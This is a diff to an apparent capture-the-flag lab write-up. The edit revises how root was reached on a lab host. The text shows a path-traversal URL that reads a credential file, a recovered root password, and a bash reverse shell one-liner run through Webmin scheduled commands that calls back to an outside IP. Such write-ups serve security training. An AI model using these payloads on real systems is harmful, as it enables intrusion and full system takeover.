@@ -32,5 +32,11 @@ Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
   https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
   ```
 - viewing the page source the page seems readable and found different password but the one i guess is right is this **jEhdIekWmdjE**
-- ssh as root with this password we got a sheel as root
+- ssh as root with this password some problem with ssh come up
+- so i try to go to port 10000 and found a webmin trying root and the password and i got in
+- create a task as root in scheduled commands
+- ```
+  bash -c 'bash -i >& /dev/tcp/10.10.16.5/444 0>&1'
+  ```
+- and now we go aroot shell
 
